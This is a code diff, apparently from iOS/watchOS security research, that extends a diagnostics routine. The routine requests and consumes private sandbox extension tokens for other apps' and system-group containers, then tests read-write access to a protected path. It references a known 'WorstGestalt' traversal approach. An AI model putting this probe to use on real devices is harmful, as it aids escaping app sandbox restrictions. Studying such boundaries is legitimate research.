@@ -8,6 +8,7 @@
 #import <string.h>
 #import <sys/stat.h>
 #import <sys/utsname.h>
+#import <sys/sysctl.h>
 
 typedef void *(*BQCreateFn)(void);
 typedef void (*BQSetU64Fn)(void *, uint64_t);
@@ -22,8 +23,14 @@ typedef void (*BQFreeFn)(void *);
 typedef int64_t (*BQConsumeFn)(const char *);
 typedef int64_t (*BQReleaseFn)(int64_t);
 
+typedef void *(*BQErrorFn)(void *);
+typedef int (*BQErrorIntFn)(void *);
+
 typedef struct {
     void *library;
+    BQErrorFn lastError;
+    BQPathFn errorMessage;
+    BQErrorIntFn errorPosix;
     BQCreateFn create;
     BQSetU64Fn setClass;
     BQSetObjFn setIdentifiers;
@@ -69,6 +76,9 @@ static BQProbeAPI BQLoadProbeAPI(void) {
     api.releaseToken = (BQReleaseFn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
     api.createXPCString = (BQXPCStringCreateFn)dlsym(RTLD_DEFAULT, "xpc_string_create");
     api.releaseXPCObject = (BQXPCReleaseFn)dlsym(RTLD_DEFAULT, "xpc_release");
+    api.lastError = (BQErrorFn)BQSymbol(api.library, "container_query_get_last_error", NULL);
+    api.errorMessage = (BQPathFn)BQSymbol(api.library, "container_error_get_message", NULL);
+    api.errorPosix = (BQErrorIntFn)BQSymbol(api.library, "container_error_get_posix_errno", NULL);
     return api;
 }
 
@@ -93,13 +103,14 @@ static NSString *BQOpenCheck(NSString *path, int flags) {
             S_ISREG(st.st_mode) ? @"YES" : @"NO", (long long)st.st_size];
 }
 
-static void BQRunQuery(NSMutableString *log, const BQProbeAPI *api, NSString *name,
+static void BQRunQueryPart(NSMutableString *log, const BQProbeAPI *api, NSString *name,
                        uint64_t classNumber, NSString *identifier, BOOL isGroup,
-                       NSString *domain, uint64_t flags, NSString *targetFile) {
-    [log appendFormat:@"\n=== %@ ===\nclass=%llu group=%@ part=3 flags=0x%llx\npartDomain=%@\n",
-        name, (unsigned long long)classNumber, identifier,
+                       NSString *domain, uint64_t flags, NSString *targetFile, uint64_t part) {
+    [log appendFormat:@"\n=== %@ ===\nclass=%llu group=%@ part=%llu flags=0x%llx\npartDomain=%@\n",
+        name, (unsigned long long)classNumber, identifier, (unsigned long long)part,
         (unsigned long long)flags, domain.length ? domain : @"(empty)"];
 
+    [log appendFormat:@"before query O_RDWR: %@\n", BQOpenCheck(targetFile, O_RDWR)];
     if (!api->create || !api->setClass || !api->setFlags ||
         !api->getResult || !api->copyToken || !api->consumeToken ||
         !api->releaseToken || !api->freeQuery ||
@@ -127,7 +138,7 @@ static void BQRunQuery(NSMutableString *log, const BQProbeAPI *api, NSString *na
     if (isGroup) api->setGroupIdentifiers(query, xIdentifier);
     else api->setIdentifiers(query, xIdentifier);
     if (xIdentifier) api->releaseXPCObject(xIdentifier);
-    if (api->setPart) api->setPart(query, 3);
+    if (api->setPart) api->setPart(query, part);
     if (domain.length) api->setDomain(query, domain.UTF8String);
     api->setFlags(query, flags);
 
@@ -138,9 +149,27 @@ static void BQRunQuery(NSMutableString *log, const BQProbeAPI *api, NSString *na
     [log appendFormat:@"result=%@ returnedPath=%@ token=%@\n",
         result ? @"YES" : @"NO", returnedPath ?: @"(none)",
         token ? @"YES" : @"NO"];
+    // The public query error can be empty even when the server refuses a token.
+    void *queryError = api->lastError ? api->lastError(query) : NULL;
+    const char *message = queryError && api->errorMessage ? api->errorMessage(queryError) : NULL;
+    [log appendFormat:@"MCM error API=%@ error=%@ posix=%d message=%s\n",
+        api->lastError ? @"YES" : @"NO", queryError ? @"YES" : @"NO",
+        queryError && api->errorPosix ? api->errorPosix(queryError) : 0,
+        message ?: "(none; does not rule out server-side token denial)"];
     int64_t handle = -1;
     if (token) {
+        // Log only known class names, never the full bearer token.
+        const char *classes[] = {"com.apple.sandbox.system-group",
+            "com.apple.app-sandbox.read-write", "com.apple.app-sandbox.read"};
+        NSString *tokenClass = @"unrecognized";
+        for (unsigned i = 0; i < 3; ++i) {
+            if (strstr(token, classes[i])) { tokenClass = @(classes[i]); break; }
+        }
+        [log appendFormat:@"token class hint=%@ (text match only)\n", tokenClass];
+        errno = 0;
         handle = api->consumeToken(token);
+        int consumeError = errno;
+        if (handle < 0) [log appendFormat:@"consume errno=%d\n", consumeError];
         [log appendFormat:@"sandbox_extension_consume=%lld\n", (long long)handle];
         free(token);
     } else {
@@ -152,12 +181,29 @@ static void BQRunQuery(NSMutableString *log, const BQProbeAPI *api, NSString *na
     [log appendFormat:@"target=%@\nO_RDONLY: %@\nO_RDWR: %@\n",
         targetFile, BQOpenCheck(targetFile, O_RDONLY),
         BQOpenCheck(targetFile, O_RDWR)];
-    if (handle >= 0) api->releaseToken(handle);
+    if (handle >= 0) {
+        int64_t released = api->releaseToken(handle);
+        [log appendFormat:@"release=%lld; after release O_RDWR: %@\n",
+            (long long)released, BQOpenCheck(targetFile, O_RDWR)];
+    }
     api->freeQuery(query);
+}
+
+static void BQRunQuery(NSMutableString *log, const BQProbeAPI *api, NSString *name,
+                      uint64_t cls, NSString *identifier, BOOL group,
+                      NSString *domain, uint64_t flags, NSString *target) {
+    BQRunQueryPart(log, api, name, cls, identifier, group, domain, flags, target, 3);
 }
 
 NSString *BQRunRouteDiagnostics(void) {
     NSMutableString *log = [NSMutableString string];
+    [log appendString:@"DIAGNOSTICS v2 — token-type and container controls\n"];
+    char build[128] = {0};
+    size_t buildSize = sizeof(build);
+    if (sysctlbyname("kern.osversion", build, &buildSize, NULL, 0) != 0)
+        snprintf(build, sizeof(build), "unavailable");
+    build[sizeof(build) - 1] = 0;
+    [log appendFormat:@"OS build=%s | timestamp=%@\n", build, [NSDate date]];
     struct utsname u = {0};
     uname(&u);
     [log appendFormat:@"watchOS %@ | machine %s | kernel %s\n",
@@ -181,6 +227,24 @@ NSString *BQRunRouteDiagnostics(void) {
     if (!api.library) return log;
 
     NSString *group = @"systemgroup.com.apple.mobilegestaltcache";
+
+    // Controls vary one dimension at a time. These are not claimed bypasses.
+    // The low path bit requests a returned path; it does not add file access.
+    uint64_t types[] = {UINT64_C(0x0100000000), UINT64_C(0x0900000000),
+                        UINT64_C(0x4100000000), UINT64_C(0x8100000000)};
+    NSString *names[] = {@"path only", @"type 1", @"type 2", @"type 3"};
+    NSString *ownID = [[NSBundle mainBundle] bundleIdentifier];
+    for (unsigned i = 0; i < 4; ++i) {
+        if (ownID.length) BQRunQuery(log, &api,
+            [@"Own Class2 API control / " stringByAppendingString:names[i]],
+            2, ownID, NO, @"", types[i], privatePath);
+        BQRunQuery(log, &api, [@"Geod direct / " stringByAppendingString:names[i]],
+            12, @"com.apple.geod", NO, @"", types[i], privatePath);
+        BQRunQuery(log, &api, [@"Class13 Caches direct / " stringByAppendingString:names[i]],
+            13, group, YES, @"", types[i], privatePath);
+        BQRunQueryPart(log, &api, [@"Class13 root direct / " stringByAppendingString:names[i]],
+            13, group, YES, @"", types[i], privatePath, 0);
+    }
 
     // Exact WorstGestalt file-level Class 13 approach, including /var alias,
     // dots(8) traversal, and flags=0x8000000000.
